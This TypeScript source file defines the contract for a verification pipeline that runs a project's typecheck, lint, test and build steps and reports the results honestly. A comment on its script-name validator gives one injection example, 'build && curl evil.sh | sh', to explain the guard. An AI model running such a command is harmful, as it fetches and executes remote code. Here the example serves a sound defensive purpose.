/**
 * Automated Verification Pipelines contract (Phase 8, P8-02).
 *
 * A subagent finishes and says the types are clean and the tests pass. That is a
 * claim. This is the contract for the evidence: the project's own verification
 * commands, run by Asterim inside the directory the subagent actually worked in,
 * with what each one exited as.
 *
 * Three things in here are load-bearing rather than cosmetic:
 *
 *   - **A step is named by what it checks, not by how it is spelled.** The name
 *     is `typecheck`, `lint`, `test`, `build` — the command behind it is
 *     `pnpm run typecheck` on one workstation and `cargo test` on another, and
 *     everything downstream (the parent's brief, the dashboard, a caller asking
 *     for a subset of steps) addresses the name.
 *   - **`passed` requires something to have run.** A pipeline that discovered
 *     nothing has not verified anything, so it is not a pass. Folding "nothing
 *     to run" into `true` is precisely the false confidence this subsystem
 *     exists to remove; `totalSteps` is what tells the two apart.
 *   - **Output is bounded here, not at the caller.** A failing build can print
 *     megabytes, and this travels through an event payload to every dashboard
 *     watching the project.
 */

/** How long one step may run before it is killed. */
export const DEFAULT_VERIFICATION_TIMEOUT_MS = 60000;

/** The longest per-step timeout a caller may ask for: fifteen minutes. */
export const MAX_VERIFICATION_TIMEOUT_MS = 900000;

/** How much of one step's stdout and stderr is kept, each. */
export const MAX_VERIFICATION_OUTPUT_CHARS = 50000;

/** How many steps one pipeline may contain, however it was configured. */
export const MAX_VERIFICATION_STEPS = 20;

/** The longest command a configuration file may declare. */
export const MAX_VERIFICATION_COMMAND_CHARS = 2000;

/**
 * Where an explicit, hand-written pipeline is looked for, in order.
 *
 * Inside `.asterim/` because that directory is already excluded from Git
 * tracking for the worktree sandboxes (P8-01), so a workstation-specific
 * pipeline does not become a commit in the operator's repository. Two names
 * because `verification.json` says what it is and `pipeline.json` is what people
 * reach for; the first one found wins.
 */
export const VERIFICATION_CONFIG_FILES: readonly string[] = [
  '.asterim/verification.json',
  '.asterim/pipeline.json'
];

/** The package managers a Node project's scripts may be run through. */
export type VerificationPackageManager = 'pnpm' | 'npm' | 'yarn' | 'bun';

/** Which lockfile names which package manager, checked in this order. */
export const VERIFICATION_LOCKFILES: readonly {
  file: string;
  manager: VerificationPackageManager;
}[] = [
  { file: 'pnpm-lock.yaml', manager: 'pnpm' },
  { file: 'yarn.lock', manager: 'yarn' },
  { file: 'bun.lockb', manager: 'bun' },
  { file: 'bun.lock', manager: 'bun' },
  { file: 'package-lock.json', manager: 'npm' }
];

/**
 * The lifecycle scripts a Node project is inspected for, in the order they run.
 *
 * Cheapest and most localising first: a typecheck failure names a file and a
 * line, a failing build at the end of a red pipeline says only that something
 * upstream was already wrong. Each entry takes the first of its spellings that
 * the project actually defines, so a repository that says `type-check` is not
 * treated as having no typechecker.
 */
export const VERIFICATION_SCRIPT_CANDIDATES: readonly {
  name: string;
  scripts: readonly string[];
}[] = [
  { name: 'typecheck', scripts: ['typecheck', 'type-check', 'types'] },
  { name: 'lint', scripts: ['lint'] },
  { name: 'test', scripts: ['test'] },
  { name: 'build', scripts: ['build'] }
];

/**
 * Whether a package script name may be put on a command line.
 *
 * A discovered script name is interpolated into `<manager> run <name>`, and
 * `package.json` is a file a delegated agent can write. A script called
 * `build && curl evil.sh | sh` is a valid JSON key and would otherwise become
 * two commands. Refusing everything that is not an ordinary script name is the
 * whole guard — the shell never sees anything else Asterim assembled itself.
 */
export function isSafeScriptName(name: unknown): boolean {
  return typeof name === 'string' && /^[A-Za-z0-9][A-Za-z0-9:._-]{0,63}$/.test(name);
}

/** One thing to run, and what to call it. */
export interface VerificationStep {
  /** What this checks: `typecheck`, `lint`, `test`, `build`, or a custom name. */
  name: string;
  /** The command line, run in the target directory through the platform shell. */
  command: string;
  /** Overrides the default per-step timeout, when the step needs longer. */
  timeoutMs?: number;
}

/** What running one step produced. */
export interface VerificationStepResult {
  name: string;
  command: string;
  passed: boolean;
  /** The process's exit code, or null when it was killed or never started. */
  exitCode: number | null;
  durationMs: number;
  /** Bounded stdout. Absent when the step produced none. */
  stdoutSummary?: string;
  /** Bounded stderr. Absent when the step produced none. */
  stderrSummary?: string;
  /** Why the step could not be judged on its exit code: a timeout, a missing binary. */
  error?: string;
}

/** Everything one pass of the pipeline established, and where. */
export interface VerificationPipelineReport {
  /**
   * Whether the directory is verified.
   *
   * True only when at least one step ran and every one of them passed. A
   * pipeline with nothing in it has checked nothing, and reads as `false` with
   * `totalSteps: 0` rather than as a pass.
   */
  passed: boolean;
  totalSteps: number;
  passedSteps: number;
  failedSteps: number;
  durationMs: number;
  steps: VerificationStepResult[];
  executedAt: number;
  /** The directory every step ran in. Absolute. */
  cwd: string;
}

/** One line saying what a verification pass established, for a brief or a badge. */
export function summarizeVerificationReport(report: VerificationPipelineReport): string {
  if (!report || report.totalSteps === 0) {
    return `no verification pipeline was discovered in ${report?.cwd ?? 'the working directory'}; nothing was verified.`;
  }

  const seconds = (report.durationMs / 1000).toFixed(1);
  if (report.passed) {
    const names = report.steps.map(step => step.name).join(', ');
    return `${report.passedSteps}/${report.totalSteps} steps passed (${names}) in ${seconds}s.`;
  }

  const broken = report.steps
    .filter(step => !step.passed)
    .map(step => `${step.name} (${step.error ? step.error : `exit ${step.exitCode}`})`)
    .join(', ');
  return `${report.failedSteps} of ${report.totalSteps} steps failed in ${seconds}s: ${broken}.`;
}
